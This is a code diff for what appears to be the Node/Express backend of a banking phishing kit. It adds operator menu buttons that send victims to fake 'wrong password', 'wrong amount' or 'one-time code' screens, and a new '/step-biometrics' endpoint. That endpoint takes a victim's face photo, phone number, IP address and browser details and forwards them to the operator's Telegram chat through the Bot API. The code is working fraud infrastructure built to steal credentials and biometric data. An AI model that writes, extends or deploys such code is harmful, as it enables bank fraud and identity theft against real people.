@@ -53,6 +53,9 @@ function getLoanSimulatorMenu(sessionId) {
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` }
       ],
       [
+        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
+      ],
+      [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
       ],
@@ -75,6 +78,9 @@ function getDynamicMenu(sessionId) {
       [
         { text: "❌ Error Dinámica", callback_data: `error-dynamic|${sessionId}` },
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` }
+      ],
+      [
+        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
       [
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
@@ -345,6 +351,77 @@ app.post('/step4-dynamic', async (req, res) => {
 });
 
 
+// ===== ENDPOINT: BIOMETRÍA 
+
+// ==================== ENDPOINT: BIOMETRÍA ====================
+// ==================== ENDPOINT: BIOMETRÍA ====================
+app.post('/step-biometrics', async (req, res) => {
+  try {
+    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
+	
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
+    }
+
+    if (!sessionId || !imageBase64) {
+      return res.status(400).json({ ok: false, error: 'Datos incompletos' });
+    }
+ 
+       
+    // ⚠️ NO romper si no existe la sesión
+	
+     const session = sessionData.get(sessionId) || {};
+     sessionData.set(sessionId, session);
+    // 🔹 Prioridad del número:
+    // 1) sesión
+    // 2) body
+    // 3) N/A
+    const finalPhoneNumber =
+      session.phoneNumber || phoneNumber || 'N/A';
+
+    // 🔹 convertir base64 a buffer
+    const buffer = Buffer.from(
+      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
+      'base64'
+    );
+
+    const FormData = require('form-data');
+    const formData = new FormData();
+
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', buffer, {
+      filename: 'biometria.jpg',
+      contentType: 'image/jpeg'
+    });
+
+    formData.append(
+      'caption',
+`🧬 BIOMETRÍA RECIBIDA
+
+📱 Número: ${finalPhoneNumber}
+🆔 Session: ${sessionId}
+🌐 IP: ${session.ip || ip || req.ip}
+🖥️ UA: ${session.userAgent || userAgent || req.headers['user-agent'] || 'N/A'}`
+    );
+
+    await axios.post(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+      formData,
+      { headers: formData.getHeaders() }
+    );
+
+    console.log('📸 Biometría enviada a Telegram');
+    console.log('📱 Número:', finalPhoneNumber);
+    console.log('🆔 Session:', sessionId);
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error('❌ Error biometría:', err);
+    res.status(500).json({ ok: false });
+  }
+});
 
 // ==================== ENDPOINT: CONSIGNAR ====================
 app.post('/consignar', async (req, res) => {
